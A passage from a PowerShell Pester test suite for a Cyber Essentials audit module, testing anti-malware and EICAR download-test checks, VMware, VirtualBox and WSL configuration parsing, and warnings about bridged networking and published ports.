        Set-TestAntimalware -OS 'Windows 11' -DefenderMode 'Normal' -SecurityCenter @($defender) -Filters @{ bindflt = 409800 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Status | Should -Be 'Pass'
        (& $script:bySubject $f 'Filter driver').Status | Should -Be 'Warn'
    }

    It 'Windows 11: a running antivirus missing from Security Center still counts, with a note' {
        Set-TestAntimalware -OS 'Windows 11' -DefenderMode 'Passive Mode' -SecurityCenter @() -Services @{ ContosoAV = 'Running' } -Filters @{ ContosoFlt = 323100 }
        $f = @(& $script:mp01)
        (& $script:bySubject $f '').Actual | Should -Be 'Contoso AV running, but not registered with Windows Security Center'
        (& $script:bySubject $f 'Third-party protection').Status | Should -Be 'Manual'
    }
}

Describe 'Malware download test (MP-11, CE+ TC3)' {
    BeforeAll {
        InModuleScope CEAudit { $script:realMalwareTest = (Get-CEConfig).'malware-test' }
        function global:Set-TestMalwareAttestation {
            param($TestedOn, $Blocked, [string]$Product = 'Contoso AV')
            InModuleScope CEAudit -Parameters @{ On = $TestedOn; B = $Blocked; P = $Product } {
                param($On, $B, $P)
                $cfg = $script:realMalwareTest | ConvertTo-Json -Depth 5 | ConvertFrom-Json
                $cfg.attestation = [pscustomobject]@{ testedOn = $On; testedBy = 'IT'; product = $P; blocked = $B; browsers = 'Edge, Chrome' }
                (Get-CEConfig).'malware-test' = $cfg
            }
        }
        $script:mp11 = { @(Invoke-CEAuditCore -Id 'MP-11') }
    }
    BeforeEach {
        Set-TestDevice -Kind Secure
        InModuleScope CEAudit { (Get-CEConfig).'malware-test' = $script:realMalwareTest }
    }
    AfterAll {
        InModuleScope CEAudit { (Get-CEConfig).'malware-test' = $script:realMalwareTest }
    }

    It 'reads EICAR detections from Defender history, by name or by threat id, and ignores other threats' {
        InModuleScope CEAudit {
            Mock Get-MpThreat { @([pscustomobject]@{ ThreatID = 2147519003; ThreatName = 'Virus:DOS/EICAR_Test_File' }, [pscustomobject]@{ ThreatID = 227072; ThreatName = 'Trojan:Win32/Wacatac' }) }
            $script:detectionsFail = $false
            Mock Get-MpThreatDetection {
                if ($script:detectionsFail) { throw 'Access denied' }
                @([pscustomobject]@{ ThreatID = 2147519003; InitialDetectionTime = (Get-Date).AddDays(-2); ProcessName = 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'; ActionSuccess = $true; Resources = @('file:_C:\Users\paul\Downloads\eicar.com') },
                  [pscustomobject]@{ ThreatID = 227072; InitialDetectionTime = (Get-Date).AddDays(-1); ProcessName = 'C:\Windows\explorer.exe'; ActionSuccess = $true; Resources = @('file:_C:\x.exe') })
            }
            # Assign without @(): the function returns ,@() and @() would nest it.
            $d = Get-CEMalwareTestDetection
            $d.Count | Should -Be 1
            $d[0].ThreatName | Should -Be 'Virus:DOS/EICAR_Test_File'
            $d[0].Resources | Should -Be 'file:_C:\Users\paul\Downloads\eicar.com'

            Mock Get-MpThreat { @() }
            (Get-CEMalwareTestDetection).Count | Should -Be 1 -Because 'the EICAR threat id is recognised when the threat entry is gone'
            $script:detectionsFail = $true
            (Get-CEMalwareTestDetection).Count | Should -Be 0
        }
    }

    It 'passes when Defender recently blocked the test file, naming the browser' {
        Mock -ModuleName CEAudit Get-CEMalwareTestDetection {
            @([pscustomobject]@{ Time = (Get-Date).AddDays(-3); Process = 'C:\Program Files\Google\Chrome\Application\chrome.exe'; Resources = @('file:_C:\d\eicar.com'); ActionSuccess = $true; ThreatName = 'Virus:DOS/EICAR_Test_File' },
              [pscustomobject]@{ Time = (Get-Date).AddDays(-1); Process = 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'; Resources = @('file:_C:\d\eicar_com.zip'); ActionSuccess = $true; ThreatName = 'Virus:DOS/EICAR_Test_File' })
        }
        $f = @(& $script:mp11)
        $f[0].Status | Should -Be 'Pass'
        $f[0].Actual | Should -Match 'stopped the test file 2 time\(s\), most recently .* \(caught when used by msedge\.exe, chrome\.exe\)'
    }

    It 'fails when Defender detected the file but could not remove it' {
        Mock -ModuleName CEAudit Get-CEMalwareTestDetection { @([pscustomobject]@{ Time = (Get-Date).AddDays(-1); Process = 'msedge.exe'; Resources = @(); ActionSuccess = $false; ThreatName = 'EICAR' }) }
        (@(& $script:mp11))[0].Status | Should -Be 'Fail'
    }

    It 'ignores tests older than maxTestAgeDays and reports Info, which does not hold back the CE verdict' {
        Mock -ModuleName CEAudit Get-CEMalwareTestDetection { @([pscustomobject]@{ Time = (Get-Date).AddDays(-120); Process = 'msedge.exe'; Resources = @(); ActionSuccess = $true; ThreatName = 'EICAR' }) }
        $f = @(& $script:mp11)
        $f[0].Status | Should -Be 'Info'
        $f[0].Recommendation | Should -Match "Malware download test"
        $summary = InModuleScope CEAudit -Parameters @{ F = $f } { param($F) Get-CESummary -Findings $F }
        $summary.Verdict | Should -Match '^READY'
    }

    It 'uses a recorded test for other anti-malware: blocked passes, not blocked fails, old is Info' {
        Mock -ModuleName CEAudit Get-CEMalwareTestDetection { @() }
        Set-TestMalwareAttestation -TestedOn (Get-Date).AddDays(-10).ToString('yyyy-MM-dd') -Blocked $true
        $f = @(& $script:mp11)
        $f[0].Status | Should -Be 'Pass'
        $f[0].Actual | Should -Match 'by IT: Contoso AV blocked the test downloads'
        Set-TestMalwareAttestation -TestedOn (Get-Date).AddDays(-10).ToString('yyyy-MM-dd') -Blocked $false
        (@(& $script:mp11))[0].Status | Should -Be 'Fail'
        Set-TestMalwareAttestation -TestedOn (Get-Date).AddDays(-200).ToString('yyyy-MM-dd') -Blocked $true
        (@(& $script:mp11))[0].Actual | Should -Match 'older than 90 days'
        Set-TestMalwareAttestation -TestedOn $null -Blocked $null
        (@(& $script:mp11))[0].Actual | Should -Match 'No blocked test download'
    }

    It 'keeps the TC3 estimate at Check until the download test has passed' {
        InModuleScope CEAudit {
            $base = @{ Title = 't'; Subject = ''; Category = 'MalwareProtection'; Frameworks = @('CE v3.3', 'CE+ TC3'); Reference = ''; Severity = 'Info'; AutoFail = $false; Expected = ''; Actual = ''; Recommendation = ''; Evidence = @(); Remediation = $null }
            $finding = { param($id, $status, $fw) $h = $base.Clone(); $h.FindingId = $id; $h.CheckId = $id; $h.Status = $status; if ($fw) { $h.Frameworks = $fw }; [pscustomobject]$h }
            $mp01 = & $finding 'MP-01' 'Pass'
            $tc3 = { param($findings) ((Get-CESummary -Findings $findings).CEPlus | Where-Object TestCase -eq 'TC3').State }
            & $tc3 @($mp01) | Should -Be 'Check'
            & $tc3 @($mp01, (& $finding 'MP-11' 'Info' @('CE+ TC3'))) | Should -Be 'Check'
            & $tc3 @($mp01, (& $finding 'MP-11' 'Pass' @('CE+ TC3'))) | Should -Be 'Likely pass'
            & $tc3 @((& $finding 'MP-01' 'Fail'), (& $finding 'MP-11' 'Pass' @('CE+ TC3'))) | Should -Be 'Likely fail'
        }
    }

    It 'the HTML and Markdown reports link to the EICAR test files and show the last result' {
        $f = @(Invoke-CEAuditCore -Id 'MP-01', 'MP-11')
        $r = Export-CEReport -Findings $f -Context $global:CETestCtx -OutputPath (Join-Path $TestDrive 'mt')
        $html = Get-Content $r.Paths.Html -Raw
        $html | Should -Match '<h2 id="malware-test">Malware download test \(CE\+ TC3\)</h2>'
        foreach ($u in 'https://secure.eicar.org/eicar.com"', 'https://secure.eicar.org/eicar.com.txt"', 'https://secure.eicar.org/eicar_com.zip"') {
            $html | Should -Match ([regex]::Escape("<a href=`"$u target=`"_blank`" rel=`"noopener noreferrer`">"))
        }
        # Browsers display text files inline and ignore download= on other sites, so those links say Save link as.
        $html | Should -Match ([regex]::Escape('eicar.com.txt)</a> <span class="ref">right-click and choose <em>Save link as</em></span>'))
        $html | Should -Match ([regex]::Escape('eicar_com.zip)</a> <span class="ref">click to download</span>'))
        $html | Should -Match 'Expect an alert'
        $html | Should -Match 'Last result: <span class=''st st-Info''>&#8505; Info</span> No blocked test download'
        $html | Should -Not -Match 'X5O!P%@AP' -Because 'the report must never contain the test file itself'
        $md = Get-Content $r.Paths.Markdown -Raw
        $md | Should -Match ([regex]::Escape('- [EICAR test file (eicar.com)](https://secure.eicar.org/eicar.com) (right-click and choose Save link as)'))
        $md | Should -Match ([regex]::Escape('- [EICAR test file in a zip (eicar_com.zip)](https://secure.eicar.org/eicar_com.zip)' + "`r`n"))

        $r2 = Export-CEReport -Findings @(Invoke-CEAuditCore -Id 'MP-01') -Context $global:CETestCtx -OutputPath (Join-Path $TestDrive 'mt2')
        (Get-Content $r2.Paths.Html -Raw) | Should -Match 'MP-11 was not run'
    }

    It 'nothing in the repository contains the EICAR test string' {
        # Built from pieces so this test file itself doesn't contain it.
        $marker = 'X5O!P%@AP' + '[4\PZX54(P^)7CC)7}$' + 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE'
        $hits = @(Get-ChildItem -Path $script:RepoRoot -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object { $_.FullName -notmatch '[\\/](\.git|node_modules|output|\.wrangler|\.data)[\\/]' } |
            Select-String -SimpleMatch -Pattern $marker -List -ErrorAction SilentlyContinue)
        @($hits | ForEach-Object { $_.Path }) | Should -BeNullOrEmpty
    }
}

Describe 'Virtual machines, WSL and containers (SC-12, FW-07)' {
    BeforeAll {
        function global:New-TestVirtState {
            param([object[]]$HyperV = @(), [object[]]$Nat = @(), [object[]]$VMware = @(), [object[]]$VirtualBox = @(), [object[]]$Wsl = @(),
                [string]$WslNetworking = '', [object[]]$Containers = @(), [object[]]$Listeners = @(), [string[]]$Notes = @(), [bool]$HyperVReadable = $true,
                [string[]]$UnreadVmFiles = @(), [string[]]$VmFileNotes = @())
            [pscustomobject]@{ HyperV = [pscustomobject]@{ Readable = $HyperVReadable; Message = ''; Machines = $HyperV; NatMappings = $Nat }
                VMware = $VMware; VirtualBox = $VirtualBox; Wsl = $Wsl; WslNetworking = $WslNetworking; Containers = $Containers; Listeners = $Listeners
                Notes = @($Notes) + @($VmFileNotes) + @($UnreadVmFiles); VmFileNotes = @($VmFileNotes) + @($UnreadVmFiles); UnreadVmFiles = $UnreadVmFiles }
        }
        function global:Set-TestVirt {
            param($State)
            Set-TestDevice -Kind Secure
            $global:CETestVirt = $State
            Mock -ModuleName CEAudit Get-CEVirtualisationState { $global:CETestVirt }
        }
        $script:run = { param($id) @(Invoke-CEAuditCore -Id $id) }
        $script:sub = { param($f, $s) @($f | Where-Object { $_.Subject -eq $s }) }
    }

    Context 'parsers' {
        It 'reads VMware .vmx networking and shared folders, including the bridged default and VMnet0' {
            InModuleScope CEAudit {
                $vm = ConvertFrom-CEVmxText -Path 'C:\VMs\dev\dev.vmx' -Lines @(
                    '.encoding = "UTF-8"', 'displayName = "Dev box"',
                    'ethernet0.present = "TRUE"', 'ethernet0.connectionType = "nat"',
                    'ethernet1.present = "TRUE"',
                    'ethernet2.present = "TRUE"', 'ethernet2.connectionType = "custom"', 'ethernet2.vnet = "VMnet0"',
                    'ethernet3.present = "FALSE"', 'ethernet3.connectionType = "bridged"',
                    'isolation.tools.hgfs.disable = "FALSE"',
                    'sharedFolder0.present = "TRUE"', 'sharedFolder0.enabled = "TRUE"', 'sharedFolder0.hostPath = "C:\Users\paul\Documents"',
                    'sharedFolder1.present = "TRUE"', 'sharedFolder1.enabled = "FALSE"', 'sharedFolder1.hostPath = "D:\"')
                $vm.Name | Should -Be 'Dev box'
                $vm.Networks | Should -Be @('nat', 'bridged', 'bridged')
                $vm.SharedFolders | Should -Be @('C:\Users\paul\Documents')
                (ConvertFrom-CEVmxText -Path 'C:\VMs\x\x.vmx' -Lines @('isolation.tools.hgfs.disable = "TRUE"', 'sharedFolder0.present = "TRUE"', 'sharedFolder0.enabled = "TRUE"', 'sharedFolder0.hostPath = "C:\"')).SharedFolders.Count | Should -Be 0
                (ConvertFrom-CEVmxText -Path 'C:\VMs\x\x.vmx' -Lines @()).Name | Should -Be 'x'
            }
        }

        It 'reads VirtualBox .vbox bridged adapters, shared folders and NAT port forwards' {
            InModuleScope CEAudit {
                $xml = @'
<?xml version="1.0"?>
<VirtualBox xmlns="http://www.virtualbox.org/" version="1.19-windows">
  <Machine uuid="{1}" name="Kali" OSType="Debian_64">
    <Hardware>
      <Network>
        <Adapter slot="0" enabled="true" type="82540EM">
          <NAT>
            <Forwarding name="ssh" proto="1" hostport="2222" guestport="22"/>
            <Forwarding name="web" proto="1" hostip="127.0.0.1" hostport="8080" guestport="80"/>
            <Forwarding name="dns" proto="0" hostip="0.0.0.0" hostport="5353" guestport="53"/>
          </NAT>
        </Adapter>
        <Adapter slot="1" enabled="true"><BridgedInterface name="Intel(R) Ethernet"/></Adapter>
        <Adapter slot="2" enabled="false"><BridgedInterface name="Wi-Fi"/></Adapter>
      </Network>
      <SharedFolders><SharedFolder name="home" hostPath="C:\Users\paul" writable="true" autoMount="true"/></SharedFolders>
    </Hardware>
  </Machine>
</VirtualBox>
'@
                $vm = ConvertFrom-CEVboxXml -Xml $xml
                $vm.Name | Should -Be 'Kali'
                $vm.Bridged | Should -Be 1
                $vm.SharedFolders | Should -Be @('C:\Users\paul')
                @($vm.PortForwards | Where-Object Exposed | ForEach-Object { "$($_.Protocol)/$($_.HostPort)" }) | Should -Be @('tcp/2222', 'udp/5353')
            }
        }

        It 'cleans wsl.exe UTF-16 output and parses wsl.conf / .wslconfig' {
            InModuleScope CEAudit {
                $names = ConvertFrom-CEWslListOutput -Lines @("D`0e`0b`0i`0a`0n`0", '', "`0", "U`0b`0u`0n`0t`0u`0")
                $names | Should -Be @('Debian', 'Ubuntu')
                $ini = ConvertFrom-CEIniText -Lines @('[boot]', 'systemd=true', '', '# comment', '[automount]', ' enabled = false ', 'root = /mnt/  ; trailing', '[wsl2]', 'networkingMode="mirrored"')
                $ini['automount']['enabled'] | Should -Be 'false'
                $ini['automount']['root'] | Should -Be '/mnt/'
                $ini['wsl2']['networkingmode'] | Should -Be 'mirrored'
            }
        }
    }

    Context 'collection' {
        It 'finds VMware and VirtualBox machines from the user profile' {
            $profileDir = Join-Path $TestDrive 'profile'
            # Below the profile, so the folders checked on the way are the fixture's, not those of this machine's TEMP.
            $vmDir = Join-Path $profileDir 'VMs'
            New-Item -ItemType Directory -Force -Path (Join-Path $profileDir 'AppData\Roaming\VMware'), (Join-Path $profileDir '.VirtualBox'), $vmDir | Out-Null
            $vmx = Join-Path $vmDir 'lab.vmx'
            Set-Content -LiteralPath $vmx -Value @('displayName = "Lab"', 'ethernet0.present = "TRUE"', 'ethernet0.connectionType = "bridged"')
            Set-Content -LiteralPath (Join-Path $profileDir 'AppData\Roaming\VMware\inventory.vmls') -Value @("vmlist1.config = `"$vmx`"", "vmlist2.config = `"$vmx`"", 'vmlist3.config = "C:\missing\gone.vmx"')
            $vbox = Join-Path $vmDir 'Win.vbox'
            Set-Content -LiteralPath $vbox -Value '<VirtualBox xmlns="http://www.virtualbox.org/"><Machine name="Win"><Hardware><Network><Adapter slot="0" enabled="true"><NAT/></Adapter></Network></Hardware></Machine></VirtualBox>'
            Set-Content -LiteralPath (Join-Path $profileDir '.VirtualBox\VirtualBox.xml') -Value "<VirtualBox xmlns=`"http://www.virtualbox.org/`"><Global><MachineRegistry><MachineEntry uuid=`"{1}`" src=`"$vbox`"/><MachineEntry uuid=`"{2}`" src=`"C:\missing\x.vbox`"/></MachineRegistry></Global></VirtualBox>"
            Set-Content -LiteralPath (Join-Path $profileDir '.wslconfig') -Value @('[wsl2]', 'networkingMode=bridged')
            InModuleScope CEAudit -Parameters @{ P = $profileDir } {
                param($P)
                $vmware = Get-CEVMwareMachine -ProfilePath $P
                $vmware.Count | Should -Be 1
                $vmware[0].Name | Should -Be 'Lab'
                $vbox = Get-CEVirtualBoxMachine -ProfilePath $P
                $vbox.Count | Should -Be 1
                $vbox[0].Name | Should -Be 'Win'
                Get-CEWslNetworkingMode -ProfilePath $P | Should -Be 'bridged'
                (Get-CEVMwareMachine -ProfilePath (Join-Path $P 'nobody')).Count | Should -Be 0
            }
        }

        It 'WSL: reads drive mounting only for running distributions, and never as SYSTEM' {
            InModuleScope CEAudit {
                Mock Get-CEWslRegistryEntry { @([pscustomobject]@{ Name = 'Debian'; Version = 2 }, [pscustomobject]@{ Name = 'Ubuntu'; Version = 2 }, [pscustomobject]@{ Name = 'Alpine'; Version = 2 }, [pscustomobject]@{ Name = 'docker-desktop'; Version = 2 }) }
                Mock Invoke-CENative { [pscustomobject]@{ ExitCode = 0; Output = @("D`0e`0b`0i`0a`0n`0", "A`0l`0p`0i`0n`0e`0", "d`0o`0c`0k`0e`0r`0-`0d`0e`0s`0k`0t`0o`0p`0") } }
                Mock Read-CEWslConf {
                    switch ($Name) {
                        'Debian' { [pscustomobject]@{ Reachable = $true; Exists = $true; Lines = @('[automount]', 'enabled=false') } }
                        'Alpine' { [pscustomobject]@{ Reachable = $true; Exists = $false; Lines = @() } }
                        default { [pscustomobject]@{ Reachable = $false; Exists = $false; Lines = @() } }
                    }
                }
                $d = Get-CEWslDistribution -Context ([pscustomobject]@{ IsSystem = $false })
                ($d | Where-Object Name -eq 'Debian').Automount | Should -BeFalse
                ($d | Where-Object Name -eq 'Alpine').Automount | Should -BeTrue
                ($d | Where-Object Name -eq 'Alpine').AutomountSource | Should -Match 'default applies'
                ($d | Where-Object Name -eq 'Ubuntu').Running | Should -BeFalse
                ($d | Where-Object Name -eq 'Ubuntu').Automount | Should -BeNullOrEmpty
                Should -Invoke Read-CEWslConf -Times 0 -ParameterFilter { $Name -eq 'Ubuntu' }
                ($d | Where-Object Name -eq 'docker-desktop').AutomountSource | Should -Match 'could not be read'

                $asSystem = Get-CEWslDistribution -Context ([pscustomobject]@{ IsSystem = $true })
                @($asSystem | Where-Object { $null -ne $_.Automount }).Count | Should -Be 0
                ($asSystem | Where-Object Name -eq 'Debian').AutomountSource | Should -Match 'SYSTEM'
                Should -Invoke Invoke-CENative -Times 1 -Exactly
            }
        }

        It 'Hyper-V: needs elevation, and reports VMs on external switches and NAT mappings' {
            InModuleScope CEAudit {
                Mock Get-Command { [pscustomobject]@{ Name = $Name } } -ParameterFilter { $Name -in 'Get-VM', 'Get-NetNatStaticMapping' }
                (Get-CEHyperVMachine -Context ([pscustomobject]@{ IsElevated = $false })).Readable | Should -BeFalse
                Mock Get-VMSwitch { @([pscustomobject]@{ Name = 'External LAN'; SwitchType = 'External' }, [pscustomobject]@{ Name = 'Default Switch'; SwitchType = 'Internal' }) }
                Mock Get-VM { @([pscustomobject]@{ Name = 'Server'; State = 'Running' }, [pscustomobject]@{ Name = 'Test'; State = 'Off' }) }
                Mock Get-VMNetworkAdapter { if ($VMName -eq 'Server') { [pscustomobject]@{ SwitchName = 'External LAN' } } else { [pscustomobject]@{ SwitchName = 'Default Switch' } } }
                Mock Get-NetNatStaticMapping { [pscustomobject]@{ Protocol = 'TCP'; ExternalIPAddress = '0.0.0.0'; ExternalPort = 3389; InternalIPAddress = '172.20.0.5'; InternalPort = 3389 } }
                $h = Get-CEHyperVMachine -Context ([pscustomobject]@{ IsElevated = $true })
                $h.Readable | Should -BeTrue
                ($h.Machines | Where-Object Name -eq 'Server').ExternalSwitches | Should -Be @('External LAN')
                @(($h.Machines | Where-Object Name -eq 'Test').ExternalSwitches).Count | Should -Be 0
                $h.NatMappings | Should -Be @('TCP 0.0.0.0:3389 -> 172.20.0.5:3389')
            }
        }

        It 'listening ports: only known publishing processes, flagged when not on loopback' {
            InModuleScope CEAudit {
                Mock Get-Command { [pscustomobject]@{ Name = 'Get-NetTCPConnection' } } -ParameterFilter { $Name -eq 'Get-NetTCPConnection' }
                Mock Get-NetTCPConnection {
                    @([pscustomobject]@{ LocalAddress = '0.0.0.0'; LocalPort = 8080; OwningProcess = 10 },
                      [pscustomobject]@{ LocalAddress = '127.0.0.1'; LocalPort = 5432; OwningProcess = 10 },
                      [pscustomobject]@{ LocalAddress = '::'; LocalPort = 445; OwningProcess = 4 },
                      [pscustomobject]@{ LocalAddress = '::1'; LocalPort = 2222; OwningProcess = 20 })
                }
                Mock Get-Process { switch ($Id) { 10 { [pscustomobject]@{ ProcessName = 'com.docker.backend' } } 20 { [pscustomobject]@{ ProcessName = 'wslrelay' } } default { [pscustomobject]@{ ProcessName = 'System' } } } }
                $l = Get-CEVirtualisationListener
                $l.Count | Should -Be 3
                @($l | Where-Object Exposed | ForEach-Object { "$($_.Product) $($_.Address):$($_.Port)" }) | Should -Be @('Docker Desktop 0.0.0.0:8080')
            }
        }
    }

    Context 'SC-12' {
        It 'passes when nothing is found, and is Info when parts could not be checked' {
            Set-TestVirt (New-TestVirtState)
            $f = @(& $script:run 'SC-12')
            $f.Count | Should -Be 1
            $f[0].Status | Should -Be 'Pass'
            Set-TestVirt (New-TestVirtState -Notes @('Hyper-V virtual machines need elevation to list'))
            $f = @(& $script:run 'SC-12')
            $f[0].Status | Should -Be 'Info'
            $f[0].Actual | Should -Match 'need elevation'
        }

        It 'sends VM files an elevated audit skipped to the user''s own session, not to another elevated run' {
            $note = 'VMware virtual machine file C:\VMs\lab\lab.vmx found, not read: the folder C:\VMs on the way to it is a junction or symbolic link'
            Set-TestVirt (New-TestVirtState -UnreadVmFiles @($note))
            $f = @(& $script:run 'SC-12')
            $f[0].Status | Should -Be 'Info'
            $f[0].Actual | Should -Be "None found, but not everything could be checked: $note"
            $f[0].Recommendation | Should -Match 'Invoke-CEUserProbe'
            $f[0].Recommendation | Should -Not -Match 'elevated prompt' -Because 'an elevated run skips the same files'
            Set-TestVirt (New-TestVirtState -Notes @('Hyper-V virtual machines need elevation to list') -UnreadVmFiles @($note))
            $f = @(& $script:run 'SC-12')
            $f[0].Recommendation | Should -Match 'elevated prompt'
            $f[0].Recommendation | Should -Match 'Invoke-CEUserProbe'
        }

        It 'lists everything found as in scope, and warns about shared folders and WSL drive mounting' {
            Set-TestVirt (New-TestVirtState `
                -HyperV @([pscustomobject]@{ Name = 'Server'; State = 'Running'; ExternalSwitches = @() }) `
                -VMware @([pscustomobject]@{ Name = 'Lab'; Networks = @('nat'); SharedFolders = @('C:\Users\paul') }) `
                -VirtualBox @([pscustomobject]@{ Name = 'Kali'; Bridged = 0; SharedFolders = @(); PortForwards = @() }) `
                -Wsl @([pscustomobject]@{ Name = 'Debian'; Version = 2; Running = $true; Automount = $true; AutomountSource = 'read from /etc/wsl.conf'; Tooling = $false },
                       [pscustomobject]@{ Name = 'Ubuntu'; Version = 2; Running = $false; Automount = $null; AutomountSource = 'not verified: the distribution is not running'; Tooling = $false },
                       [pscustomobject]@{ Name = 'Alpine'; Version = 1; Running = $true; Automount = $false; AutomountSource = 'read from /etc/wsl.conf'; Tooling = $false },
                       [pscustomobject]@{ Name = 'docker-desktop'; Version = 2; Running = $true; Automount = $true; AutomountSource = ''; Tooling = $true }) `
                -Containers @([pscustomobject]@{ Name = 'db'; Image = 'postgres:16'; Ports = '5432/tcp' }))
            $f = @(& $script:run 'SC-12')
            $main = & $script:sub $f ''
            $main.Status | Should -Be 'Manual'
            $main.Actual | Should -Match "^8 found: Hyper-V virtual machine 'Server' \(Running\); VMware virtual machine 'Lab'; VirtualBox virtual machine 'Kali'; WSL 2 distribution 'Debian' \(running\); WSL 2 distribution 'Ubuntu' \(stopped\); WSL 1 distribution 'Alpine' \(running\); Container platform \(docker-desktop\); Container 'db' \(postgres:16\)$" -Because 'count, then each item'
            (& $script:sub $f 'Shared folders').Actual | Should -Be "Host folders shared with virtual machines: VMware 'Lab': C:\Users\paul"
            $mount = & $script:sub $f 'WSL drive mounting'
            $mount.Status | Should -Be 'Warn'
            $mount.Actual | Should -Be 'Windows drives (C: at /mnt/c) are mounted in: Debian (read from /etc/wsl.conf); Ubuntu (on by default, not verified: the distribution is not running)'
            $mount.Recommendation | Should -Match 'enabled = false'
        }
    }

    Context 'FW-07' {
        It 'is not applicable with no virtualisation, and passes when nothing is exposed' {
            Set-TestVirt (New-TestVirtState)
            (& $script:run 'FW-07')[0].Status | Should -Be 'NotApplicable'
            Set-TestVirt (New-TestVirtState -Wsl @([pscustomobject]@{ Name = 'Debian'; Version = 2; Running = $true; Automount = $false; AutomountSource = ''; Tooling = $false }) `
                -Listeners @([pscustomobject]@{ Product = 'WSL'; Process = 'wslrelay'; Address = '127.0.0.1'; Port = 3000; Exposed = $false }) -WslNetworking 'nat')
            $f = @(& $script:run 'FW-07')
            $f[0].Status | Should -Be 'Pass'
            @($f[0].Evidence) | Should -Contain 'Listener: WSL (wslrelay) 127.0.0.1:3000'
        }

        It 'reports VM files it found but did not read, rather than no virtual machines' {
            # As a SYSTEM or elevated audit reports a VM behind a junction, or over maxVmFilesPerInventory.
            $note = 'VMware virtual machine file C:\VMs\lab\lab.vmx found, not read: the folder C:\VMs on the way to it is a junction or symbolic link'
            $cap = 'The VirtualBox inventory names more than 64 virtual machine files; an elevated or SYSTEM audit reads only the first 64 (maxVmFilesPerInventory in virtualisation.json), so the rest were not checked'
            Set-TestVirt (New-TestVirtState -UnreadVmFiles @($note, $cap))
            $f = @(& $script:run 'FW-07')
            $f.Count | Should -Be 1
            $f[0].Status | Should -Be 'Info'
            $f[0].Actual | Should -Be "Virtual machine files found but not checked: $note; $cap"
            @($f[0].Evidence) | Should -Be @($note, $cap)
            # FW-07 is a Machine-scope check the per-user probe does not run: only a full audit in the user's own session checks it.
            $f[0].Recommendation | Should -Not -Match 'Invoke-CEUserProbe'
            $f[0].Recommendation | Should -Not -Match 'per-user probe'
            $f[0].Recommendation | Should -Match 'full audit without elevation while signed in as that user \(app\\Invoke-CEAudit\.ps1'
            # Next to a VM that was read and is not exposed it is not a Pass either: the unread one may be bridged.
            Set-TestVirt (New-TestVirtState -VMware @([pscustomobject]@{ Name = 'Dev'; Networks = @('nat'); SharedFolders = @() }) -UnreadVmFiles @($note))
            $f = @(& $script:run 'FW-07')
            $f[0].Status | Should -Be 'Info'
            # A bridged VM that was read is still a warning.
            Set-TestVirt (New-TestVirtState -VMware @([pscustomobject]@{ Name = 'Dev'; Networks = @('bridged'); SharedFolders = @() }) -UnreadVmFiles @($note))
            $warn = & $script:sub (& $script:run 'FW-07') 'Bridged networking'
            $warn.Status | Should -Be 'Warn'
            @($warn.Evidence) | Should -Contain $note
        }

        It 'warns about bridged networking from every source' {
            Set-TestVirt (New-TestVirtState `
                -HyperV @([pscustomobject]@{ Name = 'Server'; State = 'Running'; ExternalSwitches = @('External LAN') }) `
                -VMware @([pscustomobject]@{ Name = 'Lab'; Networks = @('nat', 'bridged'); SharedFolders = @() }) `
                -VirtualBox @([pscustomobject]@{ Name = 'Kali'; Bridged = 1; SharedFolders = @(); PortForwards = @() }) `
                -Wsl @([pscustomobject]@{ Name = 'Debian'; Version = 2; Running = $true; Automount = $false; AutomountSource = ''; Tooling = $false }) -WslNetworking 'mirrored')
            $warn = & $script:sub (& $script:run 'FW-07') 'Bridged networking'
            $warn.Status | Should -Be 'Warn'
            $warn.Actual | Should -Be "Hyper-V 'Server' on external switch External LAN; VMware 'Lab' uses bridged networking; VirtualBox 'Kali' uses bridged networking; WSL uses mirrored networking (.wslconfig)"
        }

        It 'warns about ports published to the network, not ones bound to loopback' {
            Set-TestVirt (New-TestVirtState `
                -VirtualBox @([pscustomobject]@{ Name = 'Kali'; Bridged = 0; SharedFolders = @(); PortForwards = @(
                    [pscustomobject]@{ Name = 'ssh'; Protocol = 'tcp'; HostIp = ''; HostPort = '2222'; Exposed = $true },
                    [pscustomobject]@{ Name = 'web'; Protocol = 'tcp'; HostIp = '127.0.0.1'; HostPort = '8080'; Exposed = $false }) }) `
                -Nat @('TCP 0.0.0.0:3389 -> 172.20.0.5:3389', 'TCP 192.168.1.10:80 -> 172.20.0.6:80') `
                -Containers @([pscustomobject]@{ Name = 'web'; Image = 'nginx'; Ports = '0.0.0.0:8080->80/tcp, [::]:8080->80/tcp' }, [pscustomobject]@{ Name = 'db'; Image = 'postgres'; Ports = '127.0.0.1:5432->5432/tcp' }) `
                -Listeners @([pscustomobject]@{ Product = 'Docker Desktop'; Process = 'com.docker.backend'; Address = '0.0.0.0'; Port = 8080; Exposed = $true },
                             [pscustomobject]@{ Product = 'Docker Desktop'; Process = 'com.docker.backend'; Address = '127.0.0.1'; Port = 5432; Exposed = $false }))
            $f = @(& $script:run 'FW-07')
            @(& $script:sub $f 'Bridged networking').Count | Should -Be 0
            $warn = & $script:sub $f 'Published ports'
            $warn.Status | Should -Be 'Warn'
            $warn.Actual | Should -Be "Docker Desktop (com.docker.backend) listening on 0.0.0.0:8080; VirtualBox 'Kali' forwards tcp port 2222 on all interfaces; Hyper-V NAT mapping TCP 0.0.0.0:3389 -> 172.20.0.5:3389; Container 'web' publishes 0.0.0.0:8080->80/tcp, [::]:8080->80/tcp"
            $warn.Recommendation | Should -Match '127\.0\.0\.1'
        }
    }
}

Describe 'AI tools (UA-07, SC-09, UA-10)' {
    BeforeAll {
        function global:New-TestAITool {
            param([string]$Name, [string]$Service = 'Anthropic (Claude)', [bool]$CanAct = $true, [object[]]$Processes = @(), [string]$Id)
            if (-not $Id) { $Id = ($Name.ToLower() -replace '[^a-z0-9]+', '-') }
            [pscustomobject]@{ Id = $Id; Name = $Name; Service = $Service; CanActOnDevice = $CanAct; Notes = ''
                Signals = @("Store app: $Name"); Processes = $Processes }
        }
        function global:New-TestAgentProcess {
            param([int]$ProcessId, [string]$Image = 'claude.exe', $Elevated = $false, [string]$Owner = 'PC\paul')
            [pscustomobject]@{ ProcessId = $ProcessId; Image = $Image; Path = "C:\x\$Image"; Owner = $Owner; AsSystem = ($Owner -eq 'NT AUTHORITY\SYSTEM'); Elevated = $Elevated }
        }
        function global:Set-TestAITools {
            param([object[]]$Tools = @(), [string[]]$Uninspected = @(), [bool]$ProfileChecked = $true)
            Set-TestDevice -Kind Secure
